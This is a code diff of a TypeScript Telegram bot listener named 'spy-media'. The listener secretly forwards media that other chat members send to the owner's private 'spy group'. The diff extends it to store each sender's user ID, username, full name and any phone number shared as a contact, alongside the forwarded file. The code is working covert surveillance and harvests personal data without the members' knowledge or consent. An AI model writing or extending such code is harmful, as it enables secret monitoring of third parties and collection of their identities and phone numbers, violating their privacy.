@@ -1,31 +1,44 @@
-// src/listeners/spy-media-group.listener.ts
+// src/listeners/spy-media.listener.ts
 import type { Message } from '../types/misc'
 import { env } from '../service/validate-env'
 import ProcessedSpyMedia from '../db/spy-media.schema'
 import type { MessageListener } from '../utils/register-message-listeners'
 
 export const spyMediaGroupListener: MessageListener = async (ctx) => {
-  const ownerId = env.OWNER_USER_ID
-  const spyGroupId = env.SPY_GROUP_ID
-  const spyEnabled = env.SPY_ENABLED
+  const { OWNER_USER_ID, SPY_ENABLED, SPY_GROUP_ID } = env
+  if (!SPY_ENABLED) return
 
-  if (!spyEnabled) return
   const msg: Message = ctx.message as Message
-  const from = ctx.from
+  const from = ctx.from!
 
-  // 1) ignore messages you send
-  if (from.id === ownerId) return
+  // ignore your own messages
+  if (from.id === OWNER_USER_ID) return
 
-  // 2) detect media
+  // detect any media
   const media = msg.photo?.slice(-1)[0] ?? msg.document ?? msg.video ?? msg.sticker
   if (!media) return
 
   const fileUniqueId = media.file_unique_id
   if (!fileUniqueId) return
 
-  // 3) try to record it for this spy group
+  // build the user info
+  const userId = from.id
+  const username = from.username
+  const fullName = [from.first_name, from.last_name].filter(Boolean).join(' ')
+  // if they sent/forwarded a contact, capture that too
+  const phoneNumber =
+    'contact' in msg && msg.contact?.phone_number ? msg.contact.phone_number : undefined
+
+  // try to record it for this spy group
   try {
-    await new ProcessedSpyMedia({ spyGroupId, fileUniqueId }).save()
+    await new ProcessedSpyMedia({
+      spyGroupId: SPY_GROUP_ID,
+      fileUniqueId,
+      userId,
+      username,
+      fullName,
+      phoneNumber,
+    }).save()
   } catch (err: any) {
     // duplicate key → already forwarded, skip
     if (err.code === 11000) return
@@ -33,14 +46,14 @@ export const spyMediaGroupListener: MessageListener = async (ctx) => {
     return
   }
 
-  // 4) forward to your spy group
+  // forward to your spy group
   try {
     await ctx.telegram.forwardMessage(
-      spyGroupId, // where to forward
+      SPY_GROUP_ID, // where to forward
       ctx.chat.id, // original chat
       msg.message_id // original message
     )
-    console.log(`🔍 forwarded ${fileUniqueId} to spy group`)
+    console.log(`🔍 forwarded ${fileUniqueId} (from ${fullName}) to spy group`)
   } catch (forwardErr) {
     console.error('Failed to forward spy media:', forwardErr)
   }
